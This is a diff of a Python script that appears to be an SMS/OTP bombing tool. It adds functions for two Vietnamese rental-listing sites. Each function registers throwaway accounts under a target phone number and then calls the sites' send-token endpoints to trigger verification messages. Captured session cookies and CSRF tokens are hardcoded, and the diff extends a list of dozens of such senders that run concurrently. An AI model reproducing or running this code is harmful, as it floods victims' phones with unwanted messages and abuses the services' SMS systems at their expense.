+        'XSRF-TOKEN': 'eyJpdiI6IlhBMHpoMjlLUnRTaXA0Z1Y3a2pXN0E9PSIsInZhbHVlIjoiR21wTmZFNVlnL0dpSkE1RTlMUGVZQ296Mkg1aHRhUUI2WTduMVJsNW85QkRGUUZDT2dRY3MxQmRTTDhvTXRYM1FEUHowMnZHd3NjbDM3bWtTUHFrK0dpbDNkVldORFdsb2x3dVdBRHJKbTQwRFg4cm9lSDZtWGk1S0hqODdsN08iLCJtYWMiOiJjZDRiMWNkYWFhNGI2ODkwZGEzYjMwMzhjMmUyNWUyOTY1OThkZTE2ZThiNzBlZTlkYmQ1MjNjMDY3YTIwNWRmIiwidGFnIjoiIn0%3D',
+        'bds123_session': 'KlkV3gRFmHwv7NCrEL7uQIuTNmw5dZyQxwfdIBDD',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlhBMHpoMjlLUnRTaXA0Z1Y3a2pXN0E9PSIsInZhbHVlIjoiR21wTmZFNVlnL0dpSkE1RTlMUGVZQ296Mkg1aHRhUUI2WTduMVJsNW85QkRGUUZDT2dRY3MxQmRTTDhvTXRYM1FEUHowMnZHd3NjbDM3bWtTUHFrK0dpbDNkVldORFdsb2x3dVdBRHJKbTQwRFg4cm9lSDZtWGk1S0hqODdsN08iLCJtYWMiOiJjZDRiMWNkYWFhNGI2ODkwZGEzYjMwMzhjMmUyNWUyOTY1OThkZTE2ZThiNzBlZTlkYmQ1MjNjMDY3YTIwNWRmIiwidGFnIjoiIn0%3D; bds123_session=KlkV3gRFmHwv7NCrEL7uQIuTNmw5dZyQxwfdIBDD',
+        'origin': 'https://chothuephongtro.me',
+        'priority': 'u=1, i',
+        'referer': 'https://chothuephongtro.me/dang-ky.html',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'fullname': 'tran quoc ujy',
+        'phone': sdt,
+        'password': '123123aa',
+        'user_type': '1',
+    }
+
+    response = requests.post('https://chothuephongtro.me/api/user/register', cookies=cookies, headers=headers, data=data)
+
+    cookies = {
+        'XSRF-TOKEN': 'eyJpdiI6IjJQNk9vejFkZW8zbEpSYXpjTDlMdmc9PSIsInZhbHVlIjoiaytwUEpZNE1IMzJxM251UlhxN2FCNEl5alAwL2F6d042aHBnVTF0ZWw3TE10Z0NiUW1zb3ZJS0UwV1llSjJ1eDVmRGsyd0pBQ0trWDFON0J5MkZxSEw2VitmQ3F0dDJUTnpxSWF6VXNqWUU3cW92RFl0Smt3MTJYczcwNnVwSkoiLCJtYWMiOiI0NWIyMmY0ZjAxNTRkZGM4YjQxNzk2Y2M5MjgwZTViOTQ0ZWVjZTRjNjhhNDI5YjA1YzBhMDY1MzNjYzQ3MDk0IiwidGFnIjoiIn0%3D',
+        'bds123_session': 'pldVxDPc6w9k5xePQ4n7OPc9vtBW9hUQQnGQ1P8X',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IjJQNk9vejFkZW8zbEpSYXpjTDlMdmc9PSIsInZhbHVlIjoiaytwUEpZNE1IMzJxM251UlhxN2FCNEl5alAwL2F6d042aHBnVTF0ZWw3TE10Z0NiUW1zb3ZJS0UwV1llSjJ1eDVmRGsyd0pBQ0trWDFON0J5MkZxSEw2VitmQ3F0dDJUTnpxSWF6VXNqWUU3cW92RFl0Smt3MTJYczcwNnVwSkoiLCJtYWMiOiI0NWIyMmY0ZjAxNTRkZGM4YjQxNzk2Y2M5MjgwZTViOTQ0ZWVjZTRjNjhhNDI5YjA1YzBhMDY1MzNjYzQ3MDk0IiwidGFnIjoiIn0%3D; bds123_session=pldVxDPc6w9k5xePQ4n7OPc9vtBW9hUQQnGQ1P8X',
+        'origin': 'https://chothuephongtro.me',
+        'priority': 'u=1, i',
+        'referer': 'https://chothuephongtro.me/xac-thuc-tai-khoan.html?ref=aHR0cHM6Ly9jaG90aHVlcGhvbmd0cm8ubWUvZGFzaGJvYXJkL2luZGV4Lmh0bWw=',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'phone': sdt,
+        'action': 'verify',
+    }
+
+    try:
+        response = requests.post('https://chothuephongtro.me/api/user/send-token', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("CHOTHUEPHONGTRO | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("CHOTHUEPHONGTRO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def bds123():
+    cookies = {
+        'district_current': 'eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D',
+        'province_current': 'eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D',
+        'app_version': 'eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D',
+        'twk_idm_key': '-fP0gtADxbThAvD-wV1oU',
+        'XSRF-TOKEN': 'eyJpdiI6IkYzSU5zRHRkTXJhd0VNdHg0ZTUvSWc9PSIsInZhbHVlIjoidzlwV2x5SWQyTk4vd0lqZFdOMkFNZU82ZW1YOVVnYzNBVkJkckIyTXdmNzI1Q1RqUUw1dHNoODg5c2RSNmY2aGlCWkRZV2F1VWRRR2pWUlMyK3k1OE5PRU1FcTRMcER2dVRGVTJ0MkdQVGdwYnBhaHZKZ1F2ZGJOZHp3V0dSUmYiLCJtYWMiOiI3NjA2NzU4MmQ4M2EyZWFiM2IyMTUxYmY4MzMzZWUzYTRhNWRlNTdjYjhkNjI5NGYzOWVjODAyOGM3YTkxZDhjIiwidGFnIjoiIn0%3D',
+        'bds123': '6diLux24LxPKQx1NKLATa2NB9Q4y43ulG0nTd3Ua',
+        'TawkConnectionTime': '0',
+        'twk_uuid_5cda768ad07d7e0c63937723': '%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080324271%7D',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'district_current=eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D; province_current=eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D; app_version=eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D; twk_idm_key=-fP0gtADxbThAvD-wV1oU; XSRF-TOKEN=eyJpdiI6IkYzSU5zRHRkTXJhd0VNdHg0ZTUvSWc9PSIsInZhbHVlIjoidzlwV2x5SWQyTk4vd0lqZFdOMkFNZU82ZW1YOVVnYzNBVkJkckIyTXdmNzI1Q1RqUUw1dHNoODg5c2RSNmY2aGlCWkRZV2F1VWRRR2pWUlMyK3k1OE5PRU1FcTRMcER2dVRGVTJ0MkdQVGdwYnBhaHZKZ1F2ZGJOZHp3V0dSUmYiLCJtYWMiOiI3NjA2NzU4MmQ4M2EyZWFiM2IyMTUxYmY4MzMzZWUzYTRhNWRlNTdjYjhkNjI5NGYzOWVjODAyOGM3YTkxZDhjIiwidGFnIjoiIn0%3D; bds123=6diLux24LxPKQx1NKLATa2NB9Q4y43ulG0nTd3Ua; TawkConnectionTime=0; twk_uuid_5cda768ad07d7e0c63937723=%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080324271%7D',
+        'origin': 'https://bds123.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://bds123.vn/dang-ky.html?ref=aHR0cHM6Ly9iZHMxMjMudm4vY2hvLXRodWUtcGhvbmctdHJvLW5oYS10cm8taGEtbm9pLmh0bWw%3D',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-csrf-token': 'rcv27PayIN9vVSoLE2LugmP5XgFOFsDLEzrqOilN',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'fullname': 'tran quoc ujy',
+        'phone': sdt,
+        'password': '123123aA@',
+        'user_type': '1',
+        'redirect': 'https://bds123.vn/cho-thue-phong-tro-nha-tro-ha-noi.html',
+    }
+
+    response = requests.post('https://bds123.vn/api/user/register', cookies=cookies, headers=headers, data=data)
+
+    cookies = {
+        'district_current': 'eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D',
+        'province_current': 'eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D',
+        'app_version': 'eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D',
+        'twk_idm_key': '-fP0gtADxbThAvD-wV1oU',
+        'XSRF-TOKEN': 'eyJpdiI6IjdmcVBQd3dWUXRLVUFPZnZnUjJIcHc9PSIsInZhbHVlIjoiYzB2SnQvbWxRS0RwRjVEbVB0a2RHbjBPeU41MlJFS1B2cCswWm9WM2k3aHB3ZHFidXhrM0ZNNHliTDA2MUIvamsrYnRBZ29DVVdSMEVBN3djU1l4cThGbnBJdjNvMFowem5uKy9XcDVPVFdGNGdwR3kzWXVacmdnZisxQmFsbG4iLCJtYWMiOiJmMWIyOTc4YjdmNzc5MTk2YWM4YzRiNzUxZjE4ZmY3Nzc2Yjg0NTg0Mjk5MGI0OGRhYjc0MjA4YzJjOGRmYjYzIiwidGFnIjoiIn0%3D',
+        'bds123': 'tFunfHKzAWvLlUnHCQkNjJ1KITowsfhgaQz4Zjk1',
+        'TawkConnectionTime': '0',
+        'twk_uuid_5cda768ad07d7e0c63937723': '%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080347759%7D',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'district_current=eyJpdiI6ImJPZWhBcUNTMnV0WWszdXZ5OHU3TkE9PSIsInZhbHVlIjoiMXZ5T1MzQk95SHZoSzI1QzJjSXM3ZWZKSGgxYnF5MlczcFFMVTdyRXhsK1N4cHdmSGVERTdoeWNTYTZjNkhwTCIsIm1hYyI6ImRhZGJjNjUwNWU3YzE5ZDJiODI3OWM2ZDQ3YTJkNWFhODU0NTM2MjNiZDkxMDg4OWNjM2UwYzFiMmU3Mzk2NDIiLCJ0YWciOiIifQ%3D%3D; province_current=eyJpdiI6Im9LTkFuUXNGcXJVTit3SnBzMTdtU1E9PSIsInZhbHVlIjoiU1A3dHd0Y2MrMCtoUE5iVlJxOHQrd0tJSU1tT1orUWZuTGFId3pKWTBhWG9MNFZ0UHhyMWJIeTJuVC9xT3ByZCIsIm1hYyI6IjYyMTU5N2IwN2UwNDgzMDE3ZjY0YWNkYzIyNTRmZjQ1MzNhMmUwNDllNjVhYmZlNjhiYTI5YjRjNTQ1YmVkZjIiLCJ0YWciOiIifQ%3D%3D; app_version=eyJpdiI6IlMzSmJ2MDcwWXBZSUwvWE5kNStCRVE9PSIsInZhbHVlIjoiLy96SUM3R201Rmp3N3YzOXNRbW9JV1lFdTNVTmtsQkxzbmlUT0YwQnp6NDRtamFCUjNzdjVncEZ4aTFtaFFiTSIsIm1hYyI6ImEzMmUxZWRjZTIzMjk4MTI0MmE4MjQzN2JmN2E5YjgyYWViN2JmMGJhODllNWM5MWM2YjI0ZDE2MWIxYjgyY2YiLCJ0YWciOiIifQ%3D%3D; twk_idm_key=-fP0gtADxbThAvD-wV1oU; XSRF-TOKEN=eyJpdiI6IjdmcVBQd3dWUXRLVUFPZnZnUjJIcHc9PSIsInZhbHVlIjoiYzB2SnQvbWxRS0RwRjVEbVB0a2RHbjBPeU41MlJFS1B2cCswWm9WM2k3aHB3ZHFidXhrM0ZNNHliTDA2MUIvamsrYnRBZ29DVVdSMEVBN3djU1l4cThGbnBJdjNvMFowem5uKy9XcDVPVFdGNGdwR3kzWXVacmdnZisxQmFsbG4iLCJtYWMiOiJmMWIyOTc4YjdmNzc5MTk2YWM4YzRiNzUxZjE4ZmY3Nzc2Yjg0NTg0Mjk5MGI0OGRhYjc0MjA4YzJjOGRmYjYzIiwidGFnIjoiIn0%3D; bds123=tFunfHKzAWvLlUnHCQkNjJ1KITowsfhgaQz4Zjk1; TawkConnectionTime=0; twk_uuid_5cda768ad07d7e0c63937723=%7B%22uuid%22%3A%221.PUq9jalhNzyiFdQssiGttsZuiHT68fRk3RZXE2guTApSqZcPfV8ZsnWkEUjB1N9xmg997dIna7InVgv1ML7uLifgm2WntwgcyKx6BKNm2ES9Feolw%22%2C%22version%22%3A3%2C%22domain%22%3A%22bds123.vn%22%2C%22ts%22%3A1723080347759%7D',
+        'origin': 'https://bds123.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://bds123.vn/xac-thuc-tai-khoan.html?ref=aHR0cHM6Ly9iZHMxMjMudm4v',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-csrf-token': 'rcv27PayIN9vVSoLE2LugmP5XgFOFsDLEzrqOilN',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'phone_or_email': sdt,
+        'action': 'verify',
+    }
+
+    try:
+        response = requests.post('https://bds123.vn/api/user/send-token', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("BDS123 | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("BDS123 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
 def call_functions():
     functions = [
         tv360, beautybox, kingfood, batdongsan, futabus, galaxyplay, hoangphuc, gumac, vinamilk,
@@ -3944,11 +4620,12 @@ def call_functions():
         dienmayxanh, meta, thefaceshop, bestexpress, ghnexpress, myviettel, fptshop, sapo, paynet,
         reebok, gapowork, shine, oreka, fmstyle, acfc, fptlongchauzl, thuocsi, pantio,
         winny, owen, befood, foodhubzl, heyu, pantioresend, vttelecom, vinwonders, vietair, vexere,
-        atadi, etrip4u, tinyworld, chudu24, sojo, hasaki, kiehls, emart, hanoia, ahamove, fahasa,
+        atadi, etrip4u, tinyworld, chudu24, sojo, hasaki, kiehls, emart, hanoia, ahamove, fahasa, book365reg,
         vascara, sablanca, sandro, routine, coolmate, mioto, coolmatereset, pharmartsms, medigosms, avakids,
-        giathuoctot, medigozl, ddmevabereg, pnjsms, pharmartzl, jiohealth, ddmevabe, xanhsmreg,
-        nhathuocankhang, mutosi, mocha, sigo, vietravel, pnjzl, mamanbebe, tatmart, dominos,
-        pico, hacom, liena, gofood, pasgo, coolmateresend, vietloan, viettelpost, xanhsm, acheckin
+        giathuoctot, medigozl, ddmevabereg, pnjsms, pharmartzl, jiohealth, ddmevabe, xanhsmreg, pcspostreg,
+        nhathuocankhang, mutosi, mocha, sigo, vietravel, pnjzl, mamanbebe, tatmart, dominos, ghtkreg,
+        pico, hacom, liena, gofood, pasgo, coolmateresend, vietloan, viettelpost, xanhsm, acheckin, ghtk,
+        pcspost, book365, richvn, brgshopping, nativex, vuihoc, mainguyen, phongtro123, chothuephongtro, bds123
     ]
     
     with concurrent.futures.ThreadPoolExecutor() as executor:
